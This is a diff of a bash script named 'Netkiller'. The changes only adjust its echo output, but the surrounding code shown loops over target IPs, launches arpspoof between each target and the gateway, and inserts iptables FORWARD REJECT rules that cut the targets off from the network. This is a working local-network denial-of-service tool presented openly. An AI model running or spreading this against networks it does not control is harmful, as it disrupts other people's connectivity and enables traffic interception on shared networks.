@@ -103,7 +103,8 @@ ARP_PIDS=()
 
 # Launch ARP spoofing and iptables rules for each IP
 for ip in "${TARGET_IPS[@]}"; do
-    echo "Applying rules and starting ARP spoofing for IP: $ip"
+echo "" 
+    echo "Applying Netkiller rules for IP: $ip"
     # Start ARP spoofing (target to gateway and gateway to target)
     arpspoof -i "$INTERFACE" -t "$ip" "$GATEWAY" >/dev/null 2>&1 &
     ARP_PIDS+=($!)
@@ -114,6 +115,7 @@ for ip in "${TARGET_IPS[@]}"; do
     iptables -I FORWARD -i "$INTERFACE" -s "$ip" -p udp -j REJECT --reject-with icmp-port-unreachable
 done
 
+echo ""
 echo "Netkiller rules applied for ${#TARGET_IPS[@]} IPs. Press Ctrl+C to Stop."
 trap 'echo "Clearing rules and stopping..."; 
       for ip in "${TARGET_IPS[@]}"; do 
